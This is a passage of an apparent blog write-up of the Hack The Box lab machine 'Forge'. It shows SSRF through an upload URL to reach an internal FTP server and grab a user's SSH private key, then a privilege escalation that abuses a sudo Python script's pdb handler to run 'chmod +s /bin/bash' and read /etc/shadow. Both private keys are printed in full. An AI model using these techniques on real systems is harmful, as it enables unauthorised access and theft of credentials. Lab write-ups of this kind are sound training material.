class="keyword">for</span> uploading from url.&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;The /upload endpoint has been configured <span class="keyword">for</span> easy scripting of uploads, and <span class="keyword">for</span> uploading an image, one can simply pass a url with ?u=&amp;lt;url&amp;gt;.&lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Let’s list the directory and files of ftp server.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@127.1.1.1&amp;remote=1</span><br></pre></td></tr></table></figure>
+
+<p>Got the url.</p>
+<p>It’s seems like we are inside the home directory of user it’s mean .ssh folder is also there let’s quickly check it out.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/forge]</span><br><span class="line">└─<span class="comment"># curl http://forge.htb/uploads/Z6sZibedRbDeKYBFQpBL</span></span><br><span class="line">drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap</span><br><span class="line">-rw-r-----    1 0        1000           33 Sep 12 23:17 user.txt</span><br></pre></td></tr></table></figure>
+
+<p>Let’s try to get the id_rsa of the user.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@127.1.1.1/.ssh/id_rsa&amp;remote=1</span><br></pre></td></tr></table></figure>
+
+<p>Got the id_rsa of the user.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/forge]</span><br><span class="line">└─<span class="comment"># curl http://forge.htb/uploads/rImFtfhldjbYX4CuIwZx                                                                            </span></span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAnZIO+Qywfgnftqo5as+orHW/w1WbrG6i6B7Tv2PdQ09NixOmtHR3</span><br><span class="line">rnxHouv4/l1pO2njPf5GbjVHAsMwJDXmDNjaqZfO9OYC7K7hr7FV6xlUWThwcKo0hIOVuE</span><br><span class="line">7Jh1d+jfpDYYXqON5r6DzODI5WMwLKl9n5rbtFko3xaLewkHYTE2YY3uvVppxsnCvJ/6uk</span><br><span class="line">r6p7bzcRygYrTyEAWg5gORfsqhC3HaoOxXiXgGzTWyXtf2o4zmNhstfdgWWBpEfbgFgZ3D</span><br><span class="line">WJ+u2z/VObp0IIKEfsgX+cWXQUt8RJAnKgTUjGAmfNRL9nJxomYHlySQz2xL4UYXXzXr8G</span><br><span class="line">mL6X0+nKrRglaNFdC0ykLTGsiGs1+bc6jJiD1ESiebAS/ZLATTsaH46IE/vv9XOJ05qEXR</span><br><span class="line">GUz+aplzDG4wWviSNuerDy9PTGxB6kR5pGbCaEWoRPLVIb9EqnWh279mXu0b4zYhEg+nyD</span><br><span class="line">K6ui/nrmRYUOadgCKXR7zlEm3mgj4hu4cFasH/KlAAAFgK9tvD2vbbw9AAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAJ2SDvkMsH4J37aqOWrPqKx1v8NVm6xuouge079j3UNPTYsTprR0d658R6Lr+P5d</span><br><span class="line">aTtp4z3+Rm41RwLDMCQ15gzY2qmXzvTmAuyu4a+xVesZVFk4cHCqNISDlbhOyYdXfo36Q2</span><br><span class="line">GF6jjea+g8zgyOVjMCypfZ+a27RZKN8Wi3sJB2ExNmGN7r1aacbJwryf+rpK+qe283EcoG</span><br><span class="line">K08hAFoOYDkX7KoQtx2qDsV4l4Bs01sl7X9qOM5jYbLX3YFlgaRH24BYGdw1ifrts/1Tm6</span><br><span class="line">dCCChH7IF/nFl0FLfESQJyoE1IxgJnzUS/ZycaJmB5ckkM9sS+FGF1816/Bpi+l9Ppyq0Y</span><br><span class="line">JWjRXQtMpC0xrIhrNfm3OoyYg9REonmwEv2SwE07Gh+OiBP77/VzidOahF0RlM/mqZcwxu</span><br><span class="line">MFr4kjbnqw8vT0xsQepEeaRmwmhFqETy1SG/RKp1odu/Zl7tG+M2IRIPp8gyurov565kWF</span><br><span class="line">DmnYAil0e85RJt5oI+IbuHBWrB/ypQAAAAMBAAEAAAGALBhHoGJwsZTJyjBwyPc72KdK9r</span><br><span class="line">rqSaLca+DUmOa1cLSsmpLxP+an52hYE7u9flFdtYa4VQznYMgAC0HcIwYCTu4Qow0cmWQU</span><br><span class="line">xW9bMPOLe7Mm66DjtmOrNrosF9vUgc92Vv0GBjCXjzqPL/p0HwdmD/hkAYK6YGfb3Ftkh0</span><br><span class="line">2AV6zzQaZ8p0WQEIQN0NZgPPAnshEfYcwjakm3rPkrRAhp3RBY5m6vD9obMB/DJelObF98</span><br><span class="line">yv9Kzlb5bDcEgcWKNhL1ZdHWJjJPApluz6oIn+uIEcLvv18hI3dhIkPeHpjTXMVl9878F+</span><br><span class="line">kHdcjpjKSnsSjhlAIVxFu3N67N8S3BFnioaWpIIbZxwhYv9OV7uARa3eU6miKmSmdUm1z/</span><br><span class="line">wDaQv1swk9HwZlXGvDRWcMTFGTGRnyetZbgA9vVKhnUtGqq0skZxoP1ju1ANVaaVzirMeu</span><br><span class="line">DXfkpfN2GkoA/ulod3LyPZx3QcT8QafdbwAJ0MHNFfKVbqDvtn8Ug4/yfLCueQdlCBAAAA</span><br><span class="line">wFoM1lMgd3jFFi0qgCRI14rDTpa7wzn5QG0HlWeZuqjFMqtLQcDlhmE1vDA7aQE6fyLYbM</span><br><span class="line">0sSeyvkPIKbckcL5YQav63Y0BwRv9npaTs9ISxvrII5n26hPF8DPamPbnAENuBmWd5iqUf</span><br><span class="line">FDb5B7L+sJai/JzYg0KbggvUd45JsVeaQrBx32Vkw8wKDD663agTMxSqRM/wT3qLk1zmvg</span><br><span class="line">NqD51AfvS/NomELAzbbrVTowVBzIAX2ZvkdhaNwHlCbsqerAAAAMEAzRnXpuHQBQI3vFkC</span><br><span class="line">9vCV+ZfL9yfI2gz9oWrk9NWOP46zuzRCmce4Lb8ia2tLQNbnG9cBTE7TARGBY0QOgIWy0P</span><br><span class="line">fikLIICAMoQseNHAhCPWXVsLL5yUydSSVZTrUnM7Uc9rLh7XDomdU7j/2lNEcCVSI/q1vZ</span><br><span class="line">dEg5oFrreGIZysTBykyizOmFGElJv5wBEV5JDYI0nfO+8xoHbwaQ2if9GLXLBFe2f0BmXr</span><br><span class="line">W/y1sxXy8nrltMVzVfCP02sbkBV9JZAAAAwQDErJZn6A+nTI+5g2LkofWK1BA0X79ccXeL</span><br><span class="line">wS5q+66leUP0KZrDdow0s77QD+86dDjoq4fMRLl4yPfWOsxEkg90rvOr3Z9ga1jPCSFNAb</span><br><span class="line">RVFD+gXCAOBF+afizL3fm40cHECsUifh24QqUSJ5f/xZBKu04Ypad8nH9nlkRdfOuh2jQb</span><br><span class="line">nR7k4+Pryk8HqgNS3/g1/Fpd52DDziDOAIfORntwkuiQSlg63hF3vadCAV3KIVLtBONXH2</span><br><span class="line">shlLupso7WoS0AAAAKdXNlckBmb3JnZQE=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>Let’s ssh in real quick and get the user.txt.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/forge]</span><br><span class="line">└─<span class="comment"># chmod 600 user </span></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/forge]</span><br><span class="line">└─<span class="comment"># ssh -i user user@10.10.11.111</span></span><br><span class="line">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Sun 12 Sep 2021 11:49:05 PM UTC</span><br><span class="line"></span><br><span class="line">  System load:  0.0               Processes:             222</span><br><span class="line">  Usage of /:   43.6% of 6.82GB   Users logged <span class="keyword">in</span>:       0</span><br><span class="line">  Memory usage: 22%               IPv4 address <span class="keyword">for</span> eth0: 10.10.11.111</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Fri Aug 20 01:32:18 2021 from 10.10.14.6</span><br><span class="line">user@forge:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(user) gid=1000(user) <span class="built_in">groups</span>=1000(user)</span><br><span class="line">user@forge:~$ <span class="built_in">whoami</span></span><br><span class="line">user</span><br><span class="line">user@forge:~$ <span class="built_in">cat</span> user.txt </span><br><span class="line">3466f6558880e529a6e586b146b3cb66</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2079.jpg"></li>
+</ul>
+<h2 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h2><p>Before start with LinPEAS let’s try some manual enumeration.</p>
+<p>And we see we can run sudo command without password.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">user@forge:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> user on forge:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User user may run the following commands on forge:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py</span><br><span class="line">user@forge:~$ </span><br></pre></td></tr></table></figure>
+
+<p>Let’s check the remote-manage.py script.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">user@forge:~$ cat /opt/remote-manage.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line"></span><br><span class="line">port = random.randint(<span class="number">1025</span>, <span class="number">65535</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sock.bind((<span class="string">&#x27;127.0.0.1&#x27;</span>, port))</span><br><span class="line">    sock.listen(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Listening on localhost:<span class="subst">&#123;port&#125;</span>&#x27;</span>)</span><br><span class="line">    (clientsock, addr) = sock.accept()</span><br><span class="line">    clientsock.send(<span class="string">b&#x27;Enter the secret passsword: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> clientsock.recv(<span class="number">1024</span>).strip().decode() != <span class="string">&#x27;secretadminpassword&#x27;</span>:</span><br><span class="line">        clientsock.send(<span class="string">b&#x27;Wrong password!\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        clientsock.send(<span class="string">b&#x27;Welcome admin!\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            clientsock.send(<span class="string">b&#x27;\nWhat do you wanna do: \n&#x27;</span>)</span><br><span class="line">            clientsock.send(<span class="string">b&#x27;[1] View processes\n&#x27;</span>)</span><br><span class="line">            clientsock.send(<span class="string">b&#x27;[2] View free memory\n&#x27;</span>)</span><br><span class="line">            clientsock.send(<span class="string">b&#x27;[3] View listening sockets\n&#x27;</span>)</span><br><span class="line">            clientsock.send(<span class="string">b&#x27;[4] Quit\n&#x27;</span>)</span><br><span class="line">            option = <span class="built_in">int</span>(clientsock.recv(<span class="number">1024</span>).strip())</span><br><span class="line">            <span class="keyword">if</span> option == <span class="number">1</span>:</span><br><span class="line">                clientsock.send(subprocess.getoutput(<span class="string">&#x27;ps aux&#x27;</span>).encode())</span><br><span class="line">            <span class="keyword">elif</span> option == <span class="number">2</span>:</span><br><span class="line">                clientsock.send(subprocess.getoutput(<span class="string">&#x27;df&#x27;</span>).encode())</span><br><span class="line">            <span class="keyword">elif</span> option == <span class="number">3</span>:</span><br><span class="line">                clientsock.send(subprocess.getoutput(<span class="string">&#x27;ss -lnt&#x27;</span>).encode())</span><br><span class="line">            <span class="keyword">elif</span> option == <span class="number">4</span>:</span><br><span class="line">                clientsock.send(<span class="string">b&#x27;Bye\n&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line">    pdb.post_mortem(e.__traceback__)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    quit()</span><br></pre></td></tr></table></figure>
+
+<p>We can clearly see that if we manage to create some error so we go to the except handler inside Python Debugger and as we running it as root so we can easily execute command with os module in the system.</p>
+<p>For that we need to ssh connection one is for start the server and second is for connect to the server.</p>
+<p>For create an error i use ‘\ in my netcat you use anything you want.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/forge]</span><br><span class="line">└─<span class="comment"># ssh -i user user@10.10.11.111</span></span><br><span class="line">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Sun 12 Sep 2021 11:57:04 PM UTC</span><br><span class="line"></span><br><span class="line">  System load:  0.0               Processes:             221</span><br><span class="line">  Usage of /:   43.6% of 6.82GB   Users logged <span class="keyword">in</span>:       1</span><br><span class="line">  Memory usage: 22%               IPv4 address <span class="keyword">for</span> eth0: 10.10.11.111</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Sun Sep 12 23:49:06 2021 from 10.10.14.11</span><br><span class="line">user@forge:~$ nc localhost 31202</span><br><span class="line">user@forge:~$ nc localhost 60401</span><br><span class="line">Enter the secret passsword: secretadminpassword</span><br><span class="line">Welcome admin!</span><br><span class="line"></span><br><span class="line">What <span class="keyword">do</span> you wanna <span class="keyword">do</span>: </span><br><span class="line">[1] View processes</span><br><span class="line">[2] View free memory</span><br><span class="line">[3] View listening sockets</span><br><span class="line">[4] Quit</span><br><span class="line"><span class="string">&#x27;\</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py</span><br><span class="line">Listening on localhost:60401</span><br><span class="line">invalid literal <span class="keyword">for</span> int() with base 10: b<span class="string">&quot;&#x27;\\&quot;</span></span><br><span class="line">&gt; /opt/remote-manage.py(27)&lt;module&gt;()</span><br><span class="line">-&gt; option = int(clientsock.recv(1024).strip())</span><br><span class="line">(Pdb)</span><br></pre></td></tr></table></figure>
+
+<p>Now we are inside the pdb let’s import the os module and use our old trick for geeting root.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(Pdb) import os</span><br><span class="line">(Pdb) os.system(<span class="string">&quot;chmod +s /bin/bash&quot;</span>)</span><br><span class="line">0</span><br><span class="line">(Pdb) <span class="built_in">exit</span>()</span><br><span class="line">user@forge:~$ /bin/bash -p</span><br><span class="line">bash-5.0<span class="comment"># cd /root</span></span><br><span class="line">bash-5.0<span class="comment"># cat root.txt</span></span><br><span class="line">c22dca0e29c88eba7f1d841820ee1fc8</span><br><span class="line">bash-5.0<span class="comment"># cat /etc/shadow | grep root</span></span><br><span class="line">root:$6$Msvc2unlR99fWBAX<span class="variable">$boGTeFujypU5XzdRYTBwRdGEUanryagtjUScvHxCfJ</span>.Jt44iwzJhad4rWhXMahebHXA6CSH3Nlr64tpusii6O/:18780:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2080.jpg"></p>
+</li>
+<li><p>and here is root id_rsa key to connect</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAusTE7uvvBLrfqDLv6I/+Xc9W/RVGA4eFPOowUNkHDZ4MTUm4cK4/</span><br><span class="line">DdTvY7o7bvSinEX26rWdG4eVY3qnBGSACl3VIGX80NsWgyZwWQT20Vj0q8gf674RB4LfB6</span><br><span class="line">i6Awm8cbm3105HxfQnqr4qr2oJEpyDVaF29zpaS+6y0Ogq7HcRkSyQyErBnGmlOYBcBvvh</span><br><span class="line">M+/j0iCCMfM6ZbZ/0ouoN4uOXzn+jh/ZJstDoEd0VH4RhnMzHA1hdo+6+OhFUbtoCFdxtP</span><br><span class="line">wfzVp0LQb2wqitREeT5GNPIVL2//tbNz+QUfuwQAEHCcveyKWDVTs/klDkcf/p9NqsAspn</span><br><span class="line">re6QhoLqzsuAXds0gThQLN+/+EUuV3sZ6wdkmHBqKbm8aaGc84P/SpnDvz249+G188NoUq</span><br><span class="line">nVSb9RCRnGy/JStP97umzhbyJLiRpRY8Dlh8Ugln6D58b5QVk3uYjP0muf+SI3No+L7+81</span><br><span class="line">iM7jNo9x2Jsg79tjP/RfgSJdTt6atSgeq9BwBJzxAAAFgPqA8Wj6gPFoAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBALrExO7r7wS636gy7+iP/l3PVv0VRgOHhTzqMFDZBw2eDE1JuHCuPw3U72O6O270</span><br><span class="line">opxF9uq1nRuHlWN6pwRkgApd1SBl/NDbFoMmcFkE9tFY9KvIH+u+EQeC3weougMJvHG5t9</span><br><span class="line">dOR8X0J6q+Kq9qCRKcg1Whdvc6WkvustDoKux3EZEskMhKwZxppTmAXAb74TPv49IggjHz</span><br><span class="line">OmW2f9KLqDeLjl85/o4f2SbLQ6BHdFR+EYZzMxwNYXaPuvjoRVG7aAhXcbT8H81adC0G9s</span><br><span class="line">KorURHk+RjTyFS9v/7Wzc/kFH7sEABBwnL3silg1U7P5JQ5HH/6fTarALKZ63ukIaC6s7L</span><br><span class="line">gF3bNIE4UCzfv/hFLld7GesHZJhwaim5vGmhnPOD/0qZw789uPfhtfPDaFKp1Um/UQkZxs</span><br><span class="line">vyUrT/e7ps4W8iS4kaUWPA5YfFIJZ+g+fG+UFZN7mIz9Jrn/kiNzaPi+/vNYjO4zaPcdib</span><br><span class="line">IO/bYz/0X4EiXU7emrUoHqvQcASc8QAAAAMBAAEAAAGAR6rR1sx5/1qmECjbnmYCuYSiYK</span><br><span class="line">MVJq2OFv3WZG+jITqQhefP+o0ibPBUm/QOclk1PLosMYxXKQUx8eZSyIC4EUJIUhJQnOQ1</span><br><span class="line">E0ZgvggFnfeAi5pThWZ9qmAxrQK1vgyyXwFg5iGHsRIrVn16a61Ipfeg/e7jc6LUm2aQ/1</span><br><span class="line">DXh7145DgxpmnpOVfgqtvydEua8w8OYMdQrlIjCnypN+WXOxk2HJxobakS7qv42zwQC4wE</span><br><span class="line">tY7nAdCwoYotuO2IDADZFcRWiPImmTnVWQvM27VKzpuDmp1kmOh8VD1qFV0GlPQIsJMHLH</span><br><span class="line">rQYJ6toBi7WaHC7H56EDd9QrVJgmmj50I90weAj8fldN+L8VSl3PKBgzdsxUH9xB3toj1z</span><br><span class="line">uYvgk7cPxcW78ObYUkmNUJNMZcA0/LezoXG7fWuhRoOf1eXIbUKYd+ygNlyxaqywufESzY</span><br><span class="line">HaGezUEV+UsI0Ll3Me7WyslZaX6hpOjhYJmN3kv0dWNJg9Nkg29Pr4iU5q+t71BYlxAAAA</span><br><span class="line">wFWKwWX2ApTatPB/5GvAs3SWT+O3bj3FXoQ3VjI5D+vPyUCx9Dr/iMOBv5YHObfxwqezzD</span><br><span class="line">0m82Zy1gwvWUPpVq4uiRPwwojqAYqDwA/gbX3+LdVR0bZFMFx2R0FzVXEIMCI5Cxvg+DBx</span><br><span class="line">NsLIQ8EbEWGp9NWOa9FeRsA8o/KjzFEPU8MlxxgaFkzsxciykNGZk1luUSsNujm7fgWv55</span><br><span class="line">ZdFmti8b1TAt5cVkHrT5Fks835XX9W8exqcOcZlEHIXOSgLQAAAMEA9cceY3X6o9Nu6xPu</span><br><span class="line">3eREkMAjIaR+cY/OrKO40Zm0NiIvpi+kOVoNtau0gXSXNryMyuGsjGuWW8IPnpr21UBJP8</span><br><span class="line">1O4kfqXdsfj067n21kofcxS4Ca6cSi7m4HU6ZGGpiC9eSJ44XRNGypKhahpxhbZqgFFdVU</span><br><span class="line">MdzdsZRFhm1tdQU8ZoqouPAX+tI3788IBG2QAgTpQ9ly7sVKMdwfT9qC3wtcgXGS1OweaC</span><br><span class="line">BUDvWd2rzP7/egeGqGWFOYZFxKhndPAAAAwQDCiVwE7LiHyZHfHN7amzdusL9odhljHkYf</span><br><span class="line">2xeZP3PERvqWr3g8xwhgT4oGUy8x3zgILYYvnX04FpfpBMke725nEyrvK/kZf/Sgp7Sk0h</span><br><span class="line">pbEabGDypeS4A3UIhtaM+VShS7wJGz8sXAbMm+JSwMt67vN95IULw6+SuyirRLUDc77N76</span><br><span class="line">xIK6PSiF7Hs2Z7BZOVQd1BpblnZrL3mbJcdvXS8n55QgDuxfJeoxKrr9r1r/WqRjtce8/A</span><br><span class="line">ZPz43Mi1EOl78AAAAKcm9vdEBmb3JnZQE=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<h3 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h3><ul>
+<li>subdomains fuzzing</li>
+<li>file upload bypass through upper case</li>
+<li>Privilege escalation through sudo python scripts</li>
+</ul>
+<h3 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h3><ul>
+<li>QQ: 1185151867</li>
+<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
+<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more……</font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2021/09/13/forge/" title="Hack-The-Box-walkthrough[forge]">https://fdlucifer.github.io/2021/09/13/forge/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
